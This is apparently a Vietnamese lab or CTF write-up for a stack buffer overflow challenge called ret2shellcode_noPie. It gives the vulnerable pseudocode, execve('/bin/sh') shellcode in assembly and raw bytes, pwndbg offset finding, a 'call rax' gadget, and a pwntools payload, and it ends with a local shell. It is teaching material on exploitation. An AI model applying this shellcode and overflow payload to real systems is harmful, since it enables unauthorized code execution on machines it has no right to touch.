# *Challenge: ret2shellcode_noPie*
***

- **Kỹ thuật ret2shellcode** là một nhánh của buffer overflow, nơi bạn không gọi một hàm có sẵn như trong ret2win, mà thay vào đó tự viết và nhúng shellcode vào payload, rồi hijack RIP để nhảy vào shellcode đó.
- **Các chế độ bảo vệ ảnh hưởng đến ret2shellcode:**
 ```
 | **Cơ chế** | **Ảnh hưởng**                           | **Giải pháp**                       |
| ---------- | --------------------------------------- | ----------------------------------- |
| NX         | Không thể thực thi shellcode trên stack | `mprotect`, `ret2libc`, hoặc bypass |
| ASLR       | Không biết địa chỉ shellcode            | Tắt ASLR hoặc leak địa chỉ          |
| Canary     | Không ghi đè được RIP trực tiếp         | Leak canary hoặc dùng format string |
 ```
*Với file chall:*
**Dùng checksec để kiểm tra:**
```shell
pwndbg> checksec
File:     /mnt/d/Documents/ISP/TASK1/2_ret2shellcode/ret2shellcode_noPie
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
- No canary -> có thể buffer overflow
- NX ko bật -> có thể thực thi shellcode trực tiếp trên stack
- PIE: No PIE -> ko cần leak địa chỉ, các địa chỉ của file bin sẽ cố định
- còn lại ko ảnh hưởng đến ret2shellcode
	
-*Xem pseudo code ở IDA xem, chương trình hoạt động ntn:*
- Có 3 hàm chính: run(), init(), main():
Mô tả chương trình: tại hàm main() trước tiên gọi hàm init() khởi tạo các bộ đệm để chuẩn nhập xuất tiếp đến gọi hàm run() nhập a1 và v2 rồi rồi return a1 kết thúc chương trình
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[80]; // [rsp+0h] [rbp-50h] BYREF

  init();
  run(v4);
  return 0;
}
```
```c
void *__fastcall run(void *a1)
{
  char v2[524]; // [rsp+10h] [rbp-210h] BYREF
  int v3; // [rsp+21Ch] [rbp-4h]

  v3 = '\0';
  puts("What's your name?");
  printf("> ");
  read(0, a1, 0x50uLL);
  puts("What do you want for christmas?");
  printf("> ");
  read(0, v2, 0x220uLL);
  return a1;
}
```
```c
void init()
{
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  setbuf(stdout, 0LL);
}
```
   

***Nhận diện ret2shellcode:***
- Không có sẵn hàm system() hoặc hàm gọi shell trong chương trình
- Chương trình có đoạn code thực hiện hàm read() vào buffer trên stack
-> có thể dùng buffer overflow để điều khiển thanh ghi rip, inject shellcode vào chính buffer (đảm bảo NX bị tắt)
- Shellcode là gì?
     Ta có đoạn code assembly sau:
```asm
section .text
    global _start

_start:
    mov rax, 0x3b                   ; syscall number 59 (execve)
    mov rdi, 2940004513965551       ; "/bin/sh" ở dạng số nguyên 64-bit
    push rdi                        ; đẩy "/bin/sh" vào stack
    mov rdi, rsp                    ; rdi = pointer tới "/bin/sh"
    xor rsi, rsi                    ; rsi = 0 (argv = NULL)
    xor rdx, rdx                    ; rdx = 0 (envp = NULL)
    syscall                         ; gọi syscall execve("/bin/sh", NULL, NULL)
```
*Chức năng của đoạn mã này là gọi syscall execve(“/bin/sh”, NULL, NULL) để mở shell*
 ```
 Disassembly
 0:  48 c7 c0 3b 00 00 00     mov    rax,0x3b
7:  48 bf 2f 62 69 6e 2f     movabs rdi,0x68732f6e69622f
e:  73 68 00
11: 57                       push   rdi
12: 48 89 e7                 mov    rdi,rsp
15: 48 31 f6                 xor    rsi,rsi
18: 48 31 d2                 xor    rdx,rdx
1b: 0f 05                    syscall
```
-> shellcode này những byte xác định trên, mỗi câu lệnh asm tương ứng với những byte xác định đó
-> **Mục tiêu**: cho chương trình return vào 1 con trỏ mà con trỏ đó trỏ vào shellcode chứa ‘/bin/sh’ của ta
***Khai thác bằng pwndbg:**
Theo ida ta thấy lỗi bof chỉ có ở chuỗi v2, chuỗi a1 khai báo đủ nên không có lỗi, ta nhảy vào hàm run() nhập chuỗi 524 kí tự bằng lệnh cyclic xem rip có bị đổi không
 ```shell
 ───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
 RAX  0x7fffffffdd00 ◂— 0xa6f6c6c6568 /* 'hello\n' */
 RBX  0x7fffffffde68 —▸ 0x7fffffffe108 ◂— '/mnt/d/Documents/ISP/TASK1/2_ret2shellcode/ret2shellcode_noPie'
 RCX  0x7ffff7e5395c (__lll_elision_init+124) ◂— mov eax, dword ptr [rip + 0x159e6e]
 RDX  0x220
 RDI  0
 RSI  0x7fffffffdae0 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0
 R9   0
 R10  0
 R11  0x202
 R12  0
 R13  0x7fffffffde78 —▸ 0x7fffffffe147 ◂— 'SHELL=/bin/bash'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
 R15  0
*RBP  0x6361616161616171 ('qaaaaaac')
*RSP  0x7fffffffdcf8 ◂— 'raaaaaachello\n'
*RIP  0x40126e (run+145) ◂— ret
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
b+ 0x401261 <run+132>    call   read@plt                    <read@plt>

   0x401266 <run+137>    mov    rax, qword ptr [rbp - 0x218]     RAX, [0x7fffffffdad8] => 0x7fffffffdd00 ◂— 0xa6f6c6c6568 /* 'hello\n' */
   0x40126d <run+144>    leave
 ► 0x40126e <run+145>    ret                                <0x6361616161616172>
 ```
*-> địa chỉ ret đã bị overwrite -> có quyền điều khiển chương trình*
- Ta có thể truyền các byte cố định của mã asm lên stack và cho thực thi các byte đó để thay đổi return thành syscall execve chiếm shell
***Viết script shellcode và payload bằng python**
Ta có đoạn mã shellcode sau:
```py
shellcode = asm('''
	mov rax, 0x3b
	mov rdi, 0x0068732f6e69622f

	push rdi
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	syscall

	''', arch = 'amd64')
```
 
- Để ý chuỗi đầu tiên ta nhập nó nằm trên thanh ghi rax, nếu overwrite địa chỉ rax và địa chỉ của ret thì ta sẽ có thể thực thi đc shellcode ta để trong.
- Ta dùng tiện ích ROPgadget để tìm cái gadget nào đó của call rax or jmp rax
 ```sh
 $ ROPgadget --binary ret2shellcode_noPie | grep "call rax"
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x0000000000401014 : call rax
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
```
*-> call_rax = 0x0000000000401014 ; jum_rax = 0x000000000040110c*
- Viết script:
   + ở lần nhập đầu tiên ta sẽ truyền shellcode vào bằng sendafter
   + ở lần nhập thứ 2 ta truyền vào payload return đến call_rax
```py
#Payload
call_rax = 0x0000000000401014

payload = flat(b'a'*536, call_rax)

p.sendline(payload)
p.interactive()
```
p/s: ta truyền vào 536 byte rác vì đã truyền chuỗi “/bin/sh\0” bao gồm 8 byte rồi nên cần truyền thêm 544 – 8 = 536 byte

**Kiểm tra lại bằng debug động xem đã gửi shellcode với payload đúng chưa**
- Kiểm tra shellcode đã được truyền vào tại thanh ghi rax chưa:
 ```sh
 pwndbg> x/10i 0x7ffd6815fcb0
   0x7ffd6815fcb0:    mov    rax,0x3b
   0x7ffd6815fcb7:    movabs rdi,0x68732f6e69622f
   0x7ffd6815fcc1:    push   rdi
   0x7ffd6815fcc2:    mov    rdi,rsp
   0x7ffd6815fcc5:    xor    rsi,rsi
   0x7ffd6815fcc8:    xor    rdx,rdx
   0x7ffd6815fccb:    syscall
   0x7ffd6815fccd:    add    BYTE PTR [rax],al
   0x7ffd6815fccf:    add    BYTE PTR [rax],al
   0x7ffd6815fcd1:    add    BYTE PTR [rax],al
pwndbg>
```
*-> đã giống với đoạn asm mình viết*
 
- Giờ gửi solve.py thử:
```sh
$ python3 solve.py
[+] Starting local process '/mnt/d/Documents/ISP/TASK1/2_ret2shellcode/ret2shellcode_noPie': pid 413
[*] Switching to interactive mode
What's your name?
> What do you want for christmas?
> $
$ ls
 report2.docx   ret2shellcode_noPie       solve.py
 report2.md     ret2shellcode_noPie.i64  '~$eport2.docx'
$ whoami
d1nhdwc
$
```
=> Đã chiếm đc shell
